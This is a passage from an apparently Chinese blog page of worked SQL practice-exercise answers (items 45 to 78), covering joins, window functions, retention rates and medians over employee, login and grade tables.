emp_no = <span class="hljs-keyword">REPLACE</span>(emp_no,<span class="hljs-number">10001</span>,<span class="hljs-number">10005</span>) <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span> = <span class="hljs-number">5</span></code></pre></div><h4 id="45"><a href="#45" class="headerlink" title="45"></a>45</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> titles_test <span class="hljs-keyword">RENAME</span> <span class="hljs-keyword">TO</span> titles_2017</code></pre></div><h4 id="46"><a href="#46" class="headerlink" title="46"></a>46</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">audit</span><span class="hljs-keyword">ADD</span> <span class="hljs-keyword">CONSTRAINT</span> <span class="hljs-keyword">FOREIGN</span> <span class="hljs-keyword">KEY</span> (emp_no)<span class="hljs-keyword">REFERENCES</span> employees_test(<span class="hljs-keyword">id</span>)</code></pre></div><h4 id="48"><a href="#48" class="headerlink" title="48"></a>48</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">UPDATE</span> salaries <span class="hljs-keyword">JOIN</span> emp_bonus <span class="hljs-keyword">ON</span> emp_bonus.emp_no = salaries.emp_no<span class="hljs-keyword">SET</span> salary=salary*<span class="hljs-number">1.1</span><span class="hljs-keyword">WHERE</span> salaries.to_date=<span class="hljs-string">'9999-01-01'</span></code></pre></div><h4 id="50"><a href="#50" class="headerlink" title="50"></a>50</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">CONCAT</span>(last_name,<span class="hljs-string">"'"</span>,first_name) <span class="hljs-keyword">FROM</span> employees</code></pre></div><h4 id="51"><a href="#51" class="headerlink" title="51"></a>51</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">LENGTH</span>(<span class="hljs-string">"10,A,B"</span>) - <span class="hljs-keyword">LENGTH</span>(<span class="hljs-keyword">REPLACE</span>(<span class="hljs-string">"10,A,B"</span>,<span class="hljs-string">','</span>,<span class="hljs-string">''</span>))</code></pre></div><h4 id="52"><a href="#52" class="headerlink" title="52"></a>52</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name <span class="hljs-keyword">FROM</span> employees<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">SUBSTR</span>(first_name,<span class="hljs-number">-2</span>,<span class="hljs-number">2</span>) <span class="hljs-comment">--从倒数第二开始，获取两个字符</span></code></pre></div><h4 id="53"><a href="#53" class="headerlink" title="53"></a>53</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> dept_no,<span class="hljs-keyword">GROUP_CONCAT</span>(emp_no SEPARATOR <span class="hljs-string">','</span>) <span class="hljs-keyword">FROM</span> dept_emp<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> dept_no</code></pre></div><h4 id="54"><a href="#54" class="headerlink" title="54"></a>54</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">AVG</span>(salary) <span class="hljs-keyword">FROM</span> salaries<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">to_date</span> = <span class="hljs-string">'9999-01-01'</span> <span class="hljs-keyword">AND</span> salary <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">IN</span> (    <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">MAX</span>(salary) <span class="hljs-keyword">AS</span> salary <span class="hljs-keyword">FROM</span> salaries    <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">to_date</span> = <span class="hljs-string">'9999-01-01'</span>    <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span>    <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">MIN</span>(salary) <span class="hljs-keyword">AS</span> salary <span class="hljs-keyword">FROM</span> salaries    <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">to_date</span> = <span class="hljs-string">'9999-01-01'</span>)</code></pre></div><h4 id="55"><a href="#55" class="headerlink" title="55"></a>55</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">5</span>,<span class="hljs-number">5</span></code></pre></div><h4 id="57"><a href="#57" class="headerlink" title="57"></a>57</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> employees<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> (    <span class="hljs-keyword">SELECT</span> emp_no <span class="hljs-keyword">FROM</span> dept_emp <span class="hljs-keyword">WHERE</span> dept_emp.emp_no = employees.emp_no)</code></pre></div><p>也可以写成</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> employees<span class="hljs-keyword">WHERE</span> emp_no = (    <span class="hljs-keyword">SELECT</span> employees.emp_no <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> dept_emp    <span class="hljs-keyword">ON</span> dept_emp.emp_no = employees.emp_no    <span class="hljs-keyword">WHERE</span> dept_emp.emp_no <span class="hljs-keyword">is</span> <span class="hljs-literal">null</span>)</code></pre></div><h4 id="59"><a href="#59" class="headerlink" title="59"></a>59</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> t1.emp_no,first_name,last_name,btype,salary,    <span class="hljs-keyword">IF</span>(btype=<span class="hljs-number">1</span>,salary*<span class="hljs-number">0.1</span>,<span class="hljs-keyword">IF</span>(btype=<span class="hljs-number">2</span>,salary*<span class="hljs-number">0.2</span>,salary*<span class="hljs-number">0.3</span>)) <span class="hljs-keyword">AS</span> bonu<span class="hljs-keyword">FROM</span> employees t1<span class="hljs-keyword">JOIN</span> emp_bonus t2 <span class="hljs-keyword">ON</span> t1.emp_no = t2.emp_no<span class="hljs-keyword">JOIN</span> salaries t3 <span class="hljs-keyword">ON</span> t1.emp_no = t3.emp_no<span class="hljs-keyword">WHERE</span> t3.to_date = <span class="hljs-string">'9999-01-01'</span></code></pre></div><h4 id="60"><a href="#60" class="headerlink" title="60"></a>60</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> emp_no,salary,<span class="hljs-keyword">SUM</span>(salary) <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> emp_no) <span class="hljs-keyword">FROM</span> salaries<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">to_date</span> = <span class="hljs-string">'9999-01-01'</span></code></pre></div><h4 id="61"><a href="#61" class="headerlink" title="61"></a>61</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name <span class="hljs-keyword">FROM</span> employees<span class="hljs-keyword">WHERE</span> first_name <span class="hljs-keyword">IN</span> (    <span class="hljs-keyword">SELECT</span> first_name <span class="hljs-keyword">FROM</span> (        <span class="hljs-keyword">SELECT</span> first_name,ROW_NUMBER() <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> first_name) <span class="hljs-keyword">AS</span> rn <span class="hljs-keyword">FROM</span> employees    ) t     <span class="hljs-keyword">WHERE</span> rn%<span class="hljs-number">2</span> = <span class="hljs-number">1</span>)</code></pre></div><h4 id="62"><a href="#62" class="headerlink" title="62"></a>62</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">FROM</span> grade<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">number</span><span class="hljs-keyword">HAVING</span> <span class="hljs-keyword">COUNT</span>(*) &gt;= <span class="hljs-number">3</span></code></pre></div><h4 id="63"><a href="#63" class="headerlink" title="63"></a>63</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,<span class="hljs-built_in">number</span>,<span class="hljs-keyword">DENSE_RANK</span>() <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">DESC</span>) <span class="hljs-keyword">FROM</span> passing_number</code></pre></div><h4 id="64"><a href="#64" class="headerlink" title="64"></a>64</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> person.id,person.name,task.content <span class="hljs-keyword">FROM</span> person<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> task <span class="hljs-keyword">ON</span> task.person_id = person.id</code></pre></div><h4 id="65"><a href="#65" class="headerlink" title="65"></a>65</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">date</span>,<span class="hljs-keyword">ROUND</span>(<span class="hljs-keyword">SUM</span>(<span class="hljs-keyword">type</span>)/<span class="hljs-keyword">COUNT</span>(*),<span class="hljs-number">3</span>) <span class="hljs-keyword">AS</span> p <span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">date</span>,<span class="hljs-keyword">IF</span>(<span class="hljs-keyword">type</span>=<span class="hljs-string">'no_completed'</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">type</span>    <span class="hljs-keyword">FROM</span> email    <span class="hljs-keyword">WHERE</span> send_id <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">IN</span> (        <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span>        <span class="hljs-keyword">WHERE</span> is_blacklist = <span class="hljs-number">1</span>    )    <span class="hljs-keyword">AND</span> receive_id <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">IN</span> (        <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span>        <span class="hljs-keyword">WHERE</span> is_blacklist = <span class="hljs-number">1</span>    )) t<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span></code></pre></div><h4 id="66"><a href="#66" class="headerlink" title="66"></a>66</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-keyword">MAX</span>(<span class="hljs-built_in">date</span>) <span class="hljs-keyword">FROM</span> login<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> user_id</code></pre></div><h4 id="67"><a href="#67" class="headerlink" title="67"></a>67</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> t2.name,t3.name,<span class="hljs-built_in">date</span> <span class="hljs-keyword">FROM</span> login t1<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">user</span> t2 <span class="hljs-keyword">ON</span> t1.user_id = t2.id<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">client</span> t3 <span class="hljs-keyword">ON</span> t1.client_id = t3.id<span class="hljs-keyword">WHERE</span> (user_id,<span class="hljs-built_in">date</span>) <span class="hljs-keyword">IN</span> (    <span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-keyword">MAX</span>(<span class="hljs-built_in">date</span>) <span class="hljs-keyword">FROM</span> login    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id)<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> t2.name</code></pre></div><h4 id="68"><a href="#68" class="headerlink" title="68"></a>68</h4><ul><li>新写法</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">ROUND</span>(<span class="hljs-keyword">SUM</span>(tag)/<span class="hljs-keyword">COUNT</span>(*),<span class="hljs-number">3</span>) <span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> t1.user_id,<span class="hljs-keyword">IF</span>(<span class="hljs-keyword">MIN</span>(t2.date) <span class="hljs-keyword">IS</span> <span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">AS</span> tag <span class="hljs-keyword">FROM</span> login t1    <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> login t2    <span class="hljs-keyword">ON</span> t1.user_id = t2.user_id <span class="hljs-keyword">AND</span> t1.date = (t2.date - <span class="hljs-number">1</span>)    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> t1.user_id) t</code></pre></div><ul><li>旧写法</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">ROUND</span>(<span class="hljs-keyword">COUNT</span>(<span class="hljs-keyword">DISTINCT</span> user_id) / (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">COUNT</span>(<span class="hljs-keyword">DISTINCT</span> user_id) <span class="hljs-keyword">FROM</span> login),<span class="hljs-number">3</span>)<span class="hljs-keyword">FROM</span> login<span class="hljs-keyword">WHERE</span> (user_id,<span class="hljs-built_in">date</span>) <span class="hljs-keyword">IN</span> (    <span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-keyword">DATE_ADD</span>(<span class="hljs-keyword">MIN</span>(<span class="hljs-built_in">date</span>),<span class="hljs-built_in">INTERVAL</span> <span class="hljs-number">1</span> <span class="hljs-keyword">DAY</span>) <span class="hljs-keyword">FROM</span> login <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id)</code></pre></div><h4 id="69"><a href="#69" class="headerlink" title="69"></a>69</h4><ul><li>新写法</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> t1.date,<span class="hljs-keyword">IF</span>(cnt <span class="hljs-keyword">IS</span> <span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>,cnt) <span class="hljs-keyword">FROM</span> login t1<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> (    <span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">date</span>,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> cnt     <span class="hljs-keyword">FROM</span> (        <span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-keyword">MIN</span>(<span class="hljs-built_in">date</span>) <span class="hljs-keyword">AS</span> <span class="hljs-built_in">date</span> <span class="hljs-keyword">FROM</span> login        <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id    ) t0    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span>) t2<span class="hljs-keyword">ON</span> t1.date = t2.date</code></pre></div><ul><li>旧写法</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-comment"># SELECT date,COUNT(*) FROM login</span><span class="hljs-comment"># WHERE (user_id,date) IN (</span><span class="hljs-comment">#     SELECT user_id,MIN(date) FROM login GROUP BY user_id</span><span class="hljs-comment"># )</span><span class="hljs-comment"># GROUP BY date</span><span class="hljs-comment">## 计数为 0 的日期没有现实(新写法基于这种写法改了下)</span><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> <span class="hljs-built_in">date</span>,<span class="hljs-keyword">SUM</span>(    <span class="hljs-keyword">CASE</span> <span class="hljs-keyword">WHEN</span> (user_id,<span class="hljs-built_in">date</span>) <span class="hljs-keyword">IN</span> (    <span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-keyword">MIN</span>(<span class="hljs-built_in">date</span>) <span class="hljs-keyword">FROM</span> login <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id    ) <span class="hljs-keyword">THEN</span> <span class="hljs-number">1</span>     <span class="hljs-keyword">ELSE</span> <span class="hljs-number">0</span>    <span class="hljs-keyword">END</span>)<span class="hljs-keyword">FROM</span> login<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span></code></pre></div><h4 id="70"><a href="#70" class="headerlink" title="70"></a>70</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> t5.date,<span class="hljs-keyword">IF</span>(p <span class="hljs-keyword">IS</span> <span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>,p) <span class="hljs-keyword">FROM</span> login t5<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> (    <span class="hljs-keyword">SELECT</span> t3.date,<span class="hljs-keyword">ROUND</span>(t4.num/t3.num,<span class="hljs-number">3</span>) <span class="hljs-keyword">AS</span> p     <span class="hljs-keyword">FROM</span> (        <span class="hljs-comment">-- 计算当天新用户数</span>        <span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">date</span>,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">num</span> <span class="hljs-keyword">FROM</span> (            <span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-keyword">MIN</span>(<span class="hljs-built_in">date</span>) <span class="hljs-keyword">AS</span> <span class="hljs-built_in">date</span> <span class="hljs-keyword">FROM</span> login            <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id        ) t1        <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span>    ) t3    <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> (        <span class="hljs-comment">-- 计算新用户次日留存数</span>        <span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">DATE</span>(t2.date<span class="hljs-number">-1</span>) <span class="hljs-keyword">AS</span> <span class="hljs-built_in">date</span>,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">num</span> <span class="hljs-keyword">FROM</span> login t1        <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> (            <span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-keyword">MIN</span>(<span class="hljs-built_in">date</span>)+<span class="hljs-number">1</span> <span class="hljs-keyword">AS</span> <span class="hljs-built_in">date</span> <span class="hljs-keyword">FROM</span> login            <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id        ) t2 <span class="hljs-keyword">ON</span> t1.user_id = t2.user_id <span class="hljs-keyword">AND</span> t1.date = t2.date        <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> t2.date     ) t4    <span class="hljs-keyword">ON</span> t3.date = t4.date) t6 <span class="hljs-keyword">ON</span> t5.date = t6.date</code></pre></div><h4 id="71"><a href="#71" class="headerlink" title="71"></a>71</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> t2.name,t1.date,<span class="hljs-keyword">SUM</span>(<span class="hljs-built_in">number</span>) <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> user_id <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span>) <span class="hljs-keyword">FROM</span> passing_number t1<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">user</span> t2 <span class="hljs-keyword">ON</span> t1.user_id = t2.id<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span>,<span class="hljs-keyword">name</span></code></pre></div><h4 id="72"><a href="#72" class="headerlink" title="72"></a>72</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">ROUND</span>(<span class="hljs-keyword">AVG</span>(score),<span class="hljs-number">3</span>) <span class="hljs-keyword">AS</span> AvgScore <span class="hljs-keyword">FROM</span> grade<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> job<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> AvgScore <span class="hljs-keyword">DESC</span></code></pre></div><h4 id="73"><a href="#73" class="headerlink" title="73"></a>73</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> t1.id,t1.job,t1.score <span class="hljs-keyword">FROM</span> grade t1<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> (    <span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">AVG</span>(score) <span class="hljs-keyword">AS</span> score <span class="hljs-keyword">FROM</span> grade    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> job) t2<span class="hljs-keyword">ON</span> t1.job = t2.job<span class="hljs-keyword">WHERE</span> t1.score &gt; t2.score<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> t1.id</code></pre></div><h4 id="74"><a href="#74" class="headerlink" title="74"></a>74</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,<span class="hljs-keyword">name</span>,score <span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> t1.id,<span class="hljs-keyword">name</span>,score,<span class="hljs-keyword">DENSE_RANK</span>() <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> language_id <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> score <span class="hljs-keyword">DESC</span>) <span class="hljs-keyword">AS</span> rn    <span class="hljs-keyword">FROM</span> grade t1    <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> <span class="hljs-string">`language`</span> t2    <span class="hljs-keyword">ON</span> t1.language_id = t2.id) t<span class="hljs-keyword">WHERE</span> rn &lt;=<span class="hljs-number">2</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">name</span>,score <span class="hljs-keyword">DESC</span></code></pre></div><h4 id="75"><a href="#75" class="headerlink" title="75"></a>75</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span>     job,    <span class="hljs-keyword">IF</span>(cnt%<span class="hljs-number">2</span>=<span class="hljs-number">1</span>,<span class="hljs-keyword">CEILING</span>(cnt/<span class="hljs-number">2</span>),<span class="hljs-keyword">ROUND</span>(cnt/<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)) <span class="hljs-keyword">AS</span> <span class="hljs-string">`start`</span>,    <span class="hljs-keyword">IF</span>(cnt%<span class="hljs-number">2</span>=<span class="hljs-number">1</span>,<span class="hljs-keyword">CEILING</span>(cnt/<span class="hljs-number">2</span>),<span class="hljs-keyword">ROUND</span>(cnt/<span class="hljs-number">2</span>+<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)) <span class="hljs-keyword">AS</span> <span class="hljs-string">`end`</span><span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> cnt <span class="hljs-keyword">FROM</span> grade    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> job) t<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> job</code></pre></div><h4 id="76"><a href="#76" class="headerlink" title="76"></a>76</h4><ul><li>新的写法</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,job,score,rn2 <span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span>         t1.job,        t1.id,        t1.score,        t2.cnt,        ROW_NUMBER() <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> job <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> score) <span class="hljs-keyword">AS</span> rn1,        ROW_NUMBER() <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> job <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> score <span class="hljs-keyword">DESC</span>) <span class="hljs-keyword">AS</span> rn2    <span class="hljs-keyword">FROM</span> grade t1    <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> (        <span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> cnt <span class="hljs-keyword">FROM</span> grade        <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> job    ) t2    <span class="hljs-keyword">ON</span> t1.job = t2.job) t<span class="hljs-keyword">WHERE</span> rn1 &gt;= cnt/<span class="hljs-number">2</span> <span class="hljs-keyword">AND</span> rn2 &gt;= cnt/<span class="hljs-number">2</span><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">id</span></code></pre></div><ul><li>旧的写法</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,job,score,t_rank <span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,job,score,ROW_NUMBER() <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> job <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> score <span class="hljs-keyword">DESC</span>) <span class="hljs-keyword">AS</span> t_rank    <span class="hljs-keyword">FROM</span> grade) c<span class="hljs-keyword">WHERE</span> (job,t_rank) <span class="hljs-keyword">IN</span> (    <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> job,<span class="hljs-keyword">ROUND</span>(t_rank,<span class="hljs-number">0</span>) <span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">IF</span>(<span class="hljs-keyword">num</span>%<span class="hljs-number">2</span>=<span class="hljs-number">1</span>,<span class="hljs-keyword">CEILING</span>(<span class="hljs-keyword">num</span>/<span class="hljs-number">2</span>),<span class="hljs-literal">null</span>) <span class="hljs-keyword">AS</span> t_rank    <span class="hljs-keyword">FROM</span> (         <span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">num</span> <span class="hljs-keyword">FROM</span> grade        <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> job    ) a    <span class="hljs-keyword">UNION</span>    <span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">IF</span>(<span class="hljs-keyword">num</span>%<span class="hljs-number">2</span>=<span class="hljs-number">0</span>,<span class="hljs-keyword">num</span>/<span class="hljs-number">2</span>,<span class="hljs-literal">null</span>) <span class="hljs-keyword">AS</span> t_rank    <span class="hljs-keyword">FROM</span> (         <span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">num</span> <span class="hljs-keyword">FROM</span> grade        <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> job    ) a    <span class="hljs-keyword">UNION</span>    <span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">IF</span>(<span class="hljs-keyword">num</span>%<span class="hljs-number">2</span>=<span class="hljs-number">0</span>,<span class="hljs-keyword">num</span>/<span class="hljs-number">2</span>+<span class="hljs-number">1</span>,<span class="hljs-literal">null</span>) <span class="hljs-keyword">AS</span> t_rank    <span class="hljs-keyword">FROM</span> (         <span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">num</span> <span class="hljs-keyword">FROM</span> grade        <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> job        ) a    ) b    <span class="hljs-keyword">WHERE</span> t_rank &lt;&gt; <span class="hljs-string">'NULL'</span>)<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">id</span></code></pre></div><h4 id="77"><a href="#77" class="headerlink" title="77"></a>77</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> order_info<span class="hljs-keyword">WHERE</span> <span class="hljs-built_in">date</span> &gt; <span class="hljs-string">'2025-10-15'</span><span class="hljs-keyword">AND</span> <span class="hljs-keyword">status</span> = <span class="hljs-string">'completed'</span><span class="hljs-keyword">AND</span> product_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'C++'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-string">'Python'</span>)<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">id</span></code></pre></div><h4 id="78"><a href="#78" class="headerlink" title="78"></a>78</h4><ul><li>新写法</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> order_info<span class="hljs-keyword">WHERE</span> <span class="hljs-built_in">date</span> &gt; <span 